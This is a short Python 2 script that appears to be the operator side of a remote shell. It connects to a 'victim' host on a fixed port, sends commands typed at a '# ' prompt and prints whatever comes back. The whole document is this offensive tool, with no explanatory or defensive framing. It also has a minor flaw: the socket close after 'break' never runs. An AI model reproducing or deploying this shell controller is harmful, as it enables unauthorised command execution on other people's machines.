#!/bin/python

import socket, subprocess, sys, time, os

user = os.getlogin()
host = '127.0.0.1'
port = 12345

client = socket.socket()
client.connect((host, port))

print('[*] Connected to victim')

while True:
    cmd_data = raw_input("# ")
    if cmd_data.find('exit') >= 0:
        break
        client.close()
    else:
        client.sendall(cmd_data)
    
    while True:
        data = client.recv(1024)
        print(data)
        if len(data) < 1024:
            break
